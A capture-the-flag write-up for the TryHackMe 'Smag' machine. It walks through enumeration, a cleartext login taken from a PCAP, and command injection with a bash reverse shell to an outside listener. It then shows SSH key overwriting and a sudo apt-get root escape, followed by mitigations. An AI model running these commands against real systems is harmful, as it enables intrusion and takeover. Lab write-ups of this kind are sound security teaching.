# Smag — TryHackMe CTF Writeup

- **OS:** Linux
- **Target IP:** `10.66.182.173`

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -A 10.66.182.173
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Two open ports were found:

- **22** — SSH
- **80** — Apache web server (title: *Smag*)

### Directory Enumeration

```bash
gobuster dir --url http://10.66.182.173:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Output:**

```
/.htaccess     (Status: 403) [Size: 278]
/.htpasswd     (Status: 403) [Size: 278]
/.hta          (Status: 403) [Size: 278]
/index.php     (Status: 200) [Size: 402]
/mail          (Status: 301) [Size: 313] [--> http://10.66.182.173/mail/]
/server-status (Status: 403) [Size: 278]
```

### Credential Discovery via PCAP

Navigating to `http://10.66.182.173/mail/` revealed a list of sent emails. One email contained the following body:

> **Network Migration**
> Due to the exponential growth of our platform, and thus the need for more systems, we need to migrate everything from our current `192.168.33.0/24` network to the `10.10.0.0/8` network.
> The previous engineer had done some network traces so hopefully they will give you an idea of how our systems are addressed.

Attached was a file named `dHJhY2Uy.pcap`.

Opening the PCAP with `cat` revealed obfuscated but readable content, including a captured HTTP POST request:

```
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0w
```

The virtual host `development.smag.thm` was added to `/etc/hosts`:

```
10.66.182.173   development.smag.thm
```

---

## Exploitation

### Remote Code Execution via Command Injection

Accessing `development.smag.thm/login.php` with the credentials `helpdesk` / `cH4nG3M3_n0w` granted access to an admin panel at `admin.php`, which exposed a **Command** input field with a **SEND** button.

The field was tested with `sleep 10`, which caused a noticeable delay — confirming unauthenticated command execution. A reverse shell was then submitted:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.220.227/4444 0>&1'
```

A listener on port `4444` caught the incoming connection, providing an interactive shell on the target.

### SSH Key Injection — Lateral Movement to `jake`

The `/home` directory contained a user named **jake**, but `/home/jake/user.txt` was not readable with the current shell permissions.

While browsing the filesystem, the file `/opt/.backups/jake_id_rsa.pub.backup` was discovered — containing jake's SSH public key. Crucially, the file was **world-writable**.

A new SSH key pair was generated locally:

```bash
ssh-keygen -t ed25519 -C "norjak.sec@gmail.com"
```

The newly generated public key was then written over the backup file:

```bash
echo "PUBLIC_KEY_SSH" > /opt/.backups/jake_id_rsa.pub.backup
```

Since the system was configured to sync this backup into jake's `authorized_keys` (via a cron job or similar mechanism), this allowed SSH login as jake:

```bash
ssh jake@10.66.182.173
```

The `user.txt` flag was then readable from `/home/jake/`.

---

## Privilege Escalation

### Sudo Misconfiguration — `apt-get` GTFOBin

Running `sudo -l` as jake revealed:

```
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Jake could run `apt-get` as root without a password. Using the well-known **GTFOBins** technique for `apt-get`:

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"
```

This spawned a root shell. The root flag was retrieved from `/root/root.txt`.

---

## Key Takeaways

The attack chain exploited three weaknesses in sequence. First, credentials were captured in cleartext inside a PCAP file left exposed on a web-accessible mail page, granting access to an internal admin panel. Second, the admin panel executed arbitrary OS commands without any sanitization, enabling a reverse shell. Third, a world-writable SSH public key backup file allowed overwriting jake's authorized keys, leading to SSH access. Finally, a `NOPASSWD` sudo entry for `apt-get` — a binary with known privilege escalation techniques — allowed full root compromise.

Mitigations include: never storing network captures on publicly accessible servers, sanitizing all user input passed to system commands, restricting file permissions on sensitive credential or key files, and auditing sudo rules to prevent dangerous binaries from being granted elevated execution rights.

---

## Tools Summary

| Tool | Purpose |
|------|---------|
| Nmap | Port discovery and service/version detection |
| Gobuster | Web directory and virtual host enumeration |
| cat / Wireshark | PCAP inspection and credential extraction |
| Netcat | Reverse shell listener |
| ssh-keygen | SSH key pair generation |
| GTFOBins (`apt-get`) | Privilege escalation via sudo misconfiguration |
